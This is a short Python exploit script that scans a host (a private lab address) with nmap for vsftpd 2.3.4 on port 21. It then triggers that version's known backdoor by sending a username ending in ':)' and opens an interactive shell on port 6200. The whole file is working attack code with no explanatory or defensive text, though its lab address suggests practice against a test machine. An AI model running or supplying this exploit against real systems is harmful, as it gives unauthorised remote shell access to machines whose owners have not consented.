#!/usr/bin/python3   

import nmap
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

ip_address = '192.168.56.103'
scanner = nmap.PortScanner()
scanner.scan(ip_address, '21')

service_name = scanner[ip_address]['tcp'][21]['product']
service_vers = scanner[ip_address]['tcp'][21]['version']
if service_name == 'vsftpd' and service_vers == '2.3.4':
	print(service_name, service_vers)
	print("the service is exploitable")
else:
	print("no services exploitable")
	exit()

def handler(signal_received, frame):
    print('   Exiting...')
    exit(0)

signal(SIGINT, handler)
host = ip_address 
portFTP = 21

user="USER user:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)")
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.")
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
tn2.close()
